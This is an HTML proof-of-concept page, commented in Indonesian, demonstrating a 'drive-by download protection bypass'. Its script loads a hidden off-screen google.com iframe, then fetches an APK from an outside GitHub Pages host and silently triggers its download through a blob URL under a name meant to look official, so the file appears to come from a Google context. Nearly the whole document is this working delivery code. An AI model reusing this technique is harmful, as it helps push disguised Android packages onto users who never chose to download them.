<html>
 <head>
  <meta charset="utf-8">
  <meta name="referrer" content="origin-when-cross-origin"> <!-- Set referrer policy ke Google-like -->
<style>
.button {
  background-color: #4CAF50;
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
}
.hidden-iframe {
  position: absolute;
  left: -9999px; /* Sembunyikan iframe */
  width: 1px;
  height: 1px;
}
</style>
 </head>
 <h3>Bypass Protection Drive-by Dowload Versi 2</h3>
 <body>
  <!-- Iframe tersembunyi untuk load Google, simulasi origin -->
  <iframe class="hidden-iframe" src="https://www.google.com" onload="simulateDownload()">Test</iframe>
  <script>
function simulateDownload() {
  // Delay singkat untuk load Google di iframe
  setTimeout(async function(){
    try {
      // Fetch APK dari GitHub, referrer otomatis dari policy (kelihatan dari google.com)
      const response = await fetch('https://aliothme.github.io/poc.apk', {
        method: 'GET',
        referrerPolicy: 'origin' // Force referrer ke origin (google.com context)
      });
    
      if (!response.ok) throw new Error('Fetch gagal');
    
      const blob = await response.blob();
      const blobUrl = URL.createObjectURL(blob); // Buat blob URL local (bypass origin spoof visual)
    
      // Buat virtual anchor untuk download, tanpa buka tab baru
      const a = document.createElement('a');
      a.href = blobUrl;
      a.download = 'poc-01.apk'; // Nama file palsu, biar kelihatan resmi
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    
      // Revoke blob setelah download
      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
    
      console.log('Download dipicu - cek referrer di devtools: seharusnya dari google.com');
    } catch (error) {
      console.error('Error:', error); // Fallback jika CORS block (GitHub allow CORS untuk APK)
    }
  }, 2000); // Delay 2 detik
}
// Trigger iframe load saat tombol diklik
function a(){
  // Reset iframe src untuk reload Google
  document.querySelector('.hidden-iframe').src = 'https://www.google.com';
}
  </script>
  <center><input type="button" class="button" value="Bypass Protection Drive-by Dowload Versi 2" onclick="a()"> </center>
 </body>
</html>
